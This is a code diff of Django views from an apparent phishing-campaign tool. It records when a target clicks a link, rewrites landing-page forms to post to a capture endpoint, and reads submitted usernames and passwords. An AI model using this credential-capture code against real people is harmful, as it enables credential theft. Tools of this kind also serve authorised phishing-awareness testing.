@@ -50,30 +50,19 @@ def runcampaign(targets,sendprofile,emaildata, campname, landfilename):
         objcampresult.save()
 
 
-def servepage(request, fname, trackid):  
-    ida = CampaignResults.objects.get(image_id = trackid)
-    ida.userClickStatus = True
-    ida.save()
-    soup = BeautifulSoup(readFile(fname), 'lxml')
-    forms = soup.find_all("form")
-    for form in forms:
-        form['action'] = "/landingpage/serve/getcreds/" + trackid
-    createFile("w", fname, str(soup))
-    print("User Clicked on the link")
-    return render(request, filename)
-
-
-def getCredentials(request):
-    try:
-        if request.method == "POST":
-            print("\n\n=================================================================================")
-            print(request.POST['uname'])
-            print(request.POST['upass'])
-            print("=================================================================================\n\n")
-            return HttpResponse("Credentials Captured.")
-    except Exception as e:
-        print("Error")
-    return redirect("/landingpage")
+def servepage(request, fname, trackid):
+    if (request.method=="GET"):
+        ida = CampaignResults.objects.get(image_id = trackid)
+        ida.userClickStatus = True
+        ida.save()
+        print("User Clicked on the link")
+        filename = fname + ".html"
+        return render(request, filename, context={"trackid":trackid, "fname":fname})
+    else:
+        z = trackid
+        a = request.POST['uname']
+        b = request.POST['upass']
+        return HttpResponse("Captured Creds")
 
 
 def campaign(request):
@@ -426,6 +415,7 @@ def manipulateContent(content):
     forms = soup.find_all("form")
     for form in forms:
         form.append("{% csrf_token %}")
+        form['action'] = "/landingpage/serve/{{ fname }}{{ trackid }}"
         input_elements = form.find_all("input")
         for input_element in input_elements:
             if input_element['type'] == "text":
@@ -475,7 +465,8 @@ def editPage(request):
             queryset = LandingPage.objects.filter(id=pid)
             if queryset.exists():
                 record = LandingPage.objects.get(id=pid)
-                createFile("w", record.filename, request.POST['content'])
+                manipulated_content = manipulateContent(request.POST['content'])
+                createFile("w", record.filename, str(manipulated_content))
                 record.name = request.POST['pagename']
                 record.userId_id = id
                 record.save()
